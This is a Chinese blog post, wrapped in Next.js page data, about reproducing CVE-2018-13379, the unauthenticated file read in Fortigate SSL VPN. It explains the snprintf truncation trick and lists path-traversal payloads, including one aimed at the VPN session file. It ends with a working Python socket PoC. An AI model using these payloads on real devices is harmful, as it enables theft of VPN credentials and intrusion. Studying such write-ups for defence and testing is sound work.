1:HL["/_next/static/media/2aaf0723e720e8b9-s.p.woff2",{"as":"font","type":"font/woff2"}]
2:HL["/_next/static/css/7049305331e382c9.css",{"as":"style"}]
0:[[["",{"children":["posts",{"children":[["slug","the-problem-about-fortigate-ssl-vpn-CVE-2018-13379","c"],{"children":["__PAGE__?{\"slug\":[\"the-problem-about-fortigate-ssl-vpn-CVE-2018-13379\"]}",{}]}]}]},"$undefined","$undefined",true],"$L3",[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/7049305331e382c9.css","precedence":"next"}]],["$L4",["$","meta",null,{"name":"next-size-adjust"}]]]]]
5:I{"id":"350","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-4bf769380402ef59.js"],"name":"ThemeProvider","async":false}
6:I{"id":"414","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-4bf769380402ef59.js"],"name":"","async":false}
7:I{"id":"9544","chunks":["272:static/chunks/webpack-7ba84a1b7b37c561.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
8:I{"id":"99","chunks":["272:static/chunks/webpack-7ba84a1b7b37c561.js","667:static/chunks/2443530c-ac8981f6a5707b30.js","139:static/chunks/139-1dec130228ce3944.js"],"name":"","async":false}
a:I{"id":"1234","chunks":["414:static/chunks/414-bfaafd372e832af9.js","185:static/chunks/app/layout-4bf769380402ef59.js"],"name":"Analytics","async":false}
3:[["$","html",null,{"lang":"en","children":["$","body",null,{"className":"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4","children":["$","$L5",null,{"attribute":"class","defaultTheme":"system","enableSystem":true,"children":[["$","div",null,{"className":"my-max mx-auto py-10 px-4","children":[["$","header",null,{"children":["$","div",null,{"className":"my-flex","children":["$","nav",null,{"className":"nav-ml text-sm font-medium space-x-6","children":[["$","$L6",null,{"href":"/","children":"Home"}],["$","$L6",null,{"href":"/about","children":"About"}]]}]}]}],["$","main",null,{"children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","posts","children",["slug","the-problem-about-fortigate-ssl-vpn-CVE-2018-13379","c"],"children"],"error":"$undefined","errorStyles":"$undefined","loading":"$undefined","loadingStyles":"$undefined","hasLoading":false,"template":["$","$L8",null,{}],"templateStyles":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","asNotFound":"$undefined","childProp":{"current":["$L9",null],"segment":"__PAGE__?{\"slug\":[\"the-problem-about-fortigate-ssl-vpn-CVE-2018-13379\"]}"},"styles":[]}],"segment":["slug","the-problem-about-fortigate-ssl-vpn-CVE-2018-13379","c"]},"styles":[]}],"segment":"posts"},"styles":[]}]}]]}],["$","$La",null,{}]]}]}]}],null]
4:[[["$","meta",null,{"charSet":"utf-8"}],["$","title",null,{"children":"关于fortigate ssl vpn CVE-2018-13379的一些问题"}],null,null,null,null,null,null,null,null,null,["$","meta",null,{"name":"viewport","content":"width=device-width, initial-scale=1"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon","sizes":"any"}]],[],null]]
b:I{"id":"1753","chunks":["110:static/chunks/110-fa1ef238a86eb8d6.js","49:static/chunks/app/posts/[...slug]/page-b5cd823d07a42590.js"],"name":"","async":false}
9:[["$","$Lb",null,{}],["$","article",null,{"className":"py-6 prose post-prose dark:prose-invert","children":[["$","div",null,{"className":"post-title","children":"关于fortigate ssl vpn CVE-2018-13379的一些问题"}],["$","time",null,{"dateTime":"2019-08-21T10:14:52.000Z","className":"post-time","children":"August 21, 2019"}],"$undefined",["$","div",null,{"className":"js-toc-content","children":[["$","h1",null,{"id":"cve-2018-13379-fortigate-ssl-vpn-未授权任意文件读取","children":[["$","a",null,{"href":"https://fortiguard.com/psirt/FG-IR-18-384","children":"CVE-2018-13379"}],": Fortigate SSL VPN 未授权任意文件读取"]}],"\n",["$","p",null,{"children":["Orange Tsai(",["$","a",null,{"href":"https://twitter.com/orange_8361","children":"@orange_8361"}],")师傅在",["$","a",null,{"href":"https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html","children":"博客"}],"中公布了关于Fortigate SSL VPN的众多漏洞，其中一个是任意文件读取漏洞，并公布了",["$","a",null,{"href":"https://github.com/milo2012/CVE-2018-13379","children":"PoC"}],"，但是相关细节没有说太多，在此记录一下自己在复现过程中遇到的问题。"]}],"\n",["$","h2",null,{"id":"任意文件路径构造","children":"任意文件路径构造"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-c","children":[["$","span",null,{"className":"hljs-built_in","children":"snprintf"}],"(s, ",["$","span",null,{"className":"hljs-number","children":"0x40"}],", ",["$","span",null,{"className":"hljs-string","children":"\"/migadmin/lang/%s.json\""}],", lang);\n"]}]}],"\n",["$","p",null,{"children":[["$","code",null,{"children":"snprintf"}],"方法指定了读取字符串的最大长度为0x40，也就是64个字符，如果超出64个字符就会发生溢出截断。我们需要通过这个的方法截断",["$","code",null,{"children":".json"}],"后缀。算上原本已经有的",["$","code",null,{"children":"/migadmin/lang/"}],"占15个字符，还有字符串最后的结束标志",["$","code",null,{"children":"\\0"}],"，我们构造的payload长度应为48。"]}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-bash","children":"/../../../..//////////dev/cmdb/sslvpn_websession\n/../../../../../../../..////////////proc/version\n/../../../../../../../..////////proc/self/mounts\n"}]}],"\n",["$","p",null,{"children":["$","img",null,{"src":"/5.jpg","alt":""}]}],"\n",["$","h2",null,{"id":"poc编写","children":"PoC编写"}],"\n",["$","p",null,{"children":"当开始着手写PoC的时候发现，并不能正确获取返回的数据。"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-python","children":[["$","span",null,{"className":"hljs-meta","children":">>> "}],["$","span",null,{"className":"hljs-keyword","children":"import"}]," requests\n",["$","span",null,{"className":"hljs-meta","children":">>> "}],"url = xxx\n",["$","span",null,{"className":"hljs-meta","children":">>> "}],"headers = xxx\n",["$","span",null,{"className":"hljs-meta","children":">>> "}],"rsp = requests.get(url, headers=headers, verify=",["$","span",null,{"className":"hljs-literal","children":"False"}],")\n",["$","span",null,{"className":"hljs-meta","children":">>> "}],["$","span",null,{"className":"hljs-built_in","children":"print"}],"(rsp.content)\n",["$","span",null,{"className":"hljs-string","children":"'var fgt_lang = \\n'"}],"\n"]}]}],"\n",["$","p",null,{"children":["换了各种姿势死活拿不到数据，可以看到",["$","code",null,{"children":"var fgt_lang = \\n"}],"的长度正好是16，而图中返回的response中的Content-Length也正好是16，这说明是返回的包被截断了。但是为什么Burp又能拿到数据呢？"]}],"\n",["$","p",null,{"children":"咨询了一下大佬后明白，Burp用的是raw socket协议读取的数据，无脑读，直到收不到数据为止。"}],"\n",["$","p",null,{"children":"简单学习了一下raw socket后终于拿到了返回的数据了："}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-python","children":[["$","span",null,{"className":"hljs-keyword","children":"import"}]," ssl\n",["$","span",null,{"className":"hljs-keyword","children":"import"}]," socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((",["$","span",null,{"className":"hljs-string","children":"'your-ip'"}],", your-port))\ns = ssl.wrap_socket(s, keyfile=",["$","span",null,{"className":"hljs-literal","children":"None"}],", certfile=",["$","span",null,{"className":"hljs-literal","children":"None"}],", server_side=",["$","span",null,{"className":"hljs-literal","children":"False"}],", cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)\ns.sendall(",["$","span",null,{"className":"hljs-string","children":"\"GET /remote/fgt_lang?lang=/../../../../../../../..////////////proc/version HTTP/1.1\\r\\nHost: your-ip:your-port\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0\\r\\nContent-Length: 0\\r\\n\\r\\n\""}],")\n\n",["$","span",null,{"className":"hljs-keyword","children":"while"}]," ",["$","span",null,{"className":"hljs-literal","children":"True"}],":\n\n    new = s.recv(",["$","span",null,{"className":"hljs-number","children":"4096"}],")\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," ",["$","span",null,{"className":"hljs-keyword","children":"not"}]," new:\n      s.close()\n      ",["$","span",null,{"className":"hljs-keyword","children":"break"}],"\n    ",["$","span",null,{"className":"hljs-built_in","children":"print"}]," new\n"]}]}]]}]]}]]
